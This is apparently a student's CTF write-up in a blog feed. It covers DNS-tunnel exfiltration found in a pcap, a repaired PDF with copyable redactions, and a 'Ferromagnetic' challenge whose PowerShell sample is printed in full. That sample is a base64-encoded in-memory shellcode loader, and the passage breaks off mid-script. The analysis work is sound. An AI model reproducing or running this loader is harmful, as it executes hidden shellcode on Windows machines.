&lt;h2 id=&quot;music-ive-listened-to-this-week&quot;&gt;Music I’ve Listened to This Week:&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://open.spotify.com/album/3A1vnUJDPz0xYMful9pO4I?si=Asy_E0SkQdGxnjhOr8H50Q&quot;&gt;Atrocity Exhibition - Danny Brown&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://open.spotify.com/track/52ylRHT88HVcIsVJ6AmetJ?si=719a58d7b8984476&quot;&gt;يا حياة قلبي - Haifa Wehbe&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://open.spotify.com/album/5ra51AaWF3iVebyhlZ1aqq?si=KyZLLgCGTXek2-wv4LN9EA&quot;&gt;1999 - Joey Bada$$&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="CTF" /><category term="writeup" /><summary type="html">This week, me and the rest of BYU Cyberia participated in AngstromCTF, a CTF put on by Montgomery Blair High School in Maryland. I was very impressed by the caliber of challenges. Most of us in BYU Cyberia (myself included) took a break from CTFs this week because of Memorial Day, so I only solved 3 challenges, one Server-side Template Injection (SSTI) using unsanitized user input, an SQL injection, and a simple RCE exploit.</summary></entry><entry><title type="html">Week 8 - DoD CorrelationOne CTF</title><link href="http://localhost:4000/year-of-hacking-0x8" rel="alternate" type="text/html" title="Week 8 - DoD CorrelationOne CTF" /><published>2024-05-20T00:00:00-06:00</published><updated>2024-05-20T00:00:00-06:00</updated><id>http://localhost:4000/Year-of-Hacking-0x8</id><content type="html" xml:base="http://localhost:4000/year-of-hacking-0x8">&lt;p&gt;On Saturday, I was selected to participate in the DoD SentinelOne challenge, a CTF put on by the US Military to recruit the best hackers in the nation. I ended up getting 109th out of 1440 participants, putting me at about the top 7.5% of the competitors.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;assets/images/blog/week8/place_marker.png&quot; alt=&quot;assets/images/blog/week8/place_marker.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In terms of challenges, this is a contender for the best CTF I’ve participated in. There was only 1 challenge that I could solve immediately, and each one taught me useful skills, and a very healthy spread of difficulty and topics. I’m looking forward to participating next year!&lt;/p&gt;

&lt;h2 id=&quot;exfil&quot;&gt;exfil&lt;/h2&gt;
&lt;p&gt;We get a network capture file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exfiltrated.pcap&lt;/code&gt; with a challenge description that says &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;We&apos;ve been alerted that something&apos;s been stolen from our network, but none of our sensors found anything out of the ordinary. Can you find if a flag was stolen from our network in the packet capture attached?&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Examining the capture in Wireshark, we can see there are a lot of outbound DNS requests from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;192.168.40.73&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8.8.8.8&lt;/code&gt;, Google’s DNS server with suspicious subdomains. For example, packet number 455 requests an A record for the domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ZDEYEEKUBK4QQF2L3HHXZXJQK6TZOTT.data.exfiltrated.com.&lt;/code&gt; Scrolling all the way to the bottom, it looks like the last packet is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WCCYJ3RRINUTCLX7QB6J777MQ====.data.exfiltrated.com&lt;/code&gt;, which looks kind of similar to base64, except since takes 3 bytes and turns it into 4, it would be impossible to get 4 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt; characters. I think the next move is to get all of the suspicious subdomains and create a single string out of them. We can use this python script to do that using the powerful &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scapy&lt;/code&gt; library:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdpcap&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;pcap_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exfiltrated_seg.pcap&quot;&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;packets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdpcap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcap_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;haslayer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;DNS&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;DNS&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# qr=0 means it&apos;s a query
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;IP&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;192.168.40.73&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;DNS&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;utf-8&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# print(query_name)
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;exfiltrated.com.&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;query_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running this returns a 28k character string, that &lt;a href=&quot;https://cyberchef.org/#input=&quot;&gt;Cyberchef&lt;/a&gt; is able to automatically to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base32, Render Image&lt;/code&gt;, which prints out the following image.
&lt;img src=&quot;assets/images/blog/week8/exfil_flag.png&quot; alt=&quot;assets/images/blog/week8/exfil_flag.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This showed a really interesting way to exfiltrate data that can dodge detection.&lt;/p&gt;

&lt;h2 id=&quot;filing-problem&quot;&gt;Filing Problem&lt;/h2&gt;
&lt;p&gt;We get a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memo&lt;/code&gt;. Running head, we can see the following result:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;14:43&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;~/ctf/dod/filing-problem ➭ &lt;span class=&quot;nb&quot;&gt;head &lt;/span&gt;memo
%
               /L 115599/O 18/E 110699/N 1/T 115285/H &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 552 222]&amp;gt;&amp;gt;
&amp;lt;&amp;lt;/DecodeParms&amp;lt;&amp;lt;/Columns 5/Predictor 12&amp;gt;&amp;gt;/Filter/FlateDecode/ID[&amp;lt;41C6FE1A40BD26449EEC33E9AD48EEC0&amp;gt;&amp;lt;31DBDB22F1535649988F4D098611E19C&amp;gt;]/Index[16 60]/Info 15 0 R/Length 123/Prev 115286/Root 17 0 R/Size 76/Type/XRef/W[1 3 1]&amp;gt;&amp;gt;stream
VϤ&lt;span class=&quot;s2&quot;&gt;&quot;9[&quot;&lt;/span&gt;Sl&amp;gt;0i&amp;amp;?#y@&lt;span class=&quot;nv&quot;&gt;$[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;B@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;D2IW&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
&amp;amp;d8d?Ј  &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;                                                                                                                                                            I1@k
startxref
0
%%EOF

&amp;lt;&amp;lt;/Filter/FlateDecode/I 157/Length 129/O 119/S 39/V 135&amp;gt;&amp;gt;stream
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luckily, I recognize this as looking similar to pdf formatting. I queried ChatGPT to generate a PDF header, and it returned this command:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-en&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;%PDF-1.7&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%âãÏÓ&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; header.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I then concatenated the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;header.pdf&lt;/code&gt; file with the given &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;memo&lt;/code&gt; using these two commands:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;header.pdf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; memo.pdf
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;memo &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; memo.pdf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Opening the file, we see it’s full of redacted info:
&lt;img src=&quot;assets/images/blog/week8/pdf-contents.png&quot; alt=&quot;assets/images/blog/week8/pdf-contents.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I selected and copied that bottom redacted box, and pasted it into a document, which revealed the flag! Unfortunately, I was in a hurry, so I didn’t record the flag.&lt;/p&gt;
&lt;h2 id=&quot;ferromagnetic&quot;&gt;Ferromagnetic&lt;/h2&gt;
&lt;p&gt;This took me a few times to write because Windows Defender kept on deleting the artifacts on the (correct) suspicion that it contained malware.&lt;/p&gt;

&lt;p&gt;The challenge gives us a powershell script:&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Set-StrictMode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Version&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DoIt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;@&apos;
ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3Vuc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnV0UrY2I5UnVDUWpqVUN0UWlJMFRHQjRKMWRCUGdvMFYzTkNhOHV5UGpxbUJLOGREUk1DMWVYckN6VnRWcGVKd2hsMjBJZWFMUzNQNk42QzZEdjhCT3NyZ1NJSjRFOHJxSWlNank2amMzTndNVVZOQUl4d2tEMnZhVVlpUVVVbGlNejlqdXpUellBNkYwbzE4K0J5VzJNMU5sdzA3Y0JxUmEyZ3F5Mm5DWEZacGVJWGU3QnowK09uZ0NPNHQwbXdCVHFyRTU3cnloTHY3WjJrOGhaRzBJMnRNVUZjWkEyQVNXRTVDVDFSQ1VVWjhURUZGVmxCQVFsY1NFMDE4RjAxSGZFNFhUUkpUVms4WFYwb1RUUUplTGlsaVFFQkdVMWNaQXdrTUNTNHBkbEJHVVE1aVJFWk5WeGtEYmt4WlNrOVBRZ3dXRFJNREMzUktUVWRNVkZBRGJYY0RGUTBTQ2dOaVUxTlBSblJHUVdoS1Z3d1dFQlFORUJVREMyaHJkMjV2RHdOUFNraEdBMlJHUUVoTUNpNHBJMDB3clJHL3h1NURFN3RiZnZ0aGhxdTBnNmV0V05qQ3VQeUNKMEpqUW5pbHFpcGJCeHBxcHlxYzZITUJuUS9HZGJEMGxsNmRiZ2wzM1FlU3JIc1JMbGp4ZGNsSWxvNmYxZ3RXbzRLRXJTMVVUQTRkSVk2UkI5UFliMkFtNm51VDZVOVF0cUZmSCtCS2N1cHQ1T1pISk5FcWFQNjZRY3Y3VDRCV011Q200MWJHZStETGl0N2MzQklSRkEwVERSTU5FaU55S3B4TycpCgpmb3IgKCR4ID0gMDsgJHggLWx0ICR2YXJfY29kZS5Db3VudDsgJHgrKykgewoJJHZhcl9jb2RlWyR4XSA9ICR2YXJfY29kZVskeF0gLWJ4b3IgMzUKfQoKJHZhcl92YSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChmdW5jX2dldF9wcm9jX2FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYyksIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkpKQokdmFyX2J1ZmZlciA9ICR2YXJfdmEuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkdmFyX2NvZGUuTGVuZ3RoLCAweDMwMDAsIDB4NDApCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJHZhcl9jb2RlLCAwLCAkdmFyX2J1ZmZlciwgJHZhcl9jb2RlLmxlbmd0aCkKCiR2YXJfcnVubWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkdmFyX2J1ZmZlciwgKGZ1bmNfZ2V0X2RlbGVnYXRlX3R5cGUgQChbSW50UHRyXSkgKFtWb2lkXSkpKQokdmFyX3J1bm1lLkludm9rZShbSW50UHRyXTo6WmVybyk=
&apos;@&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aa1234&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.Text.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;UTF8.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;System.&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$DoIt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;IntPtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
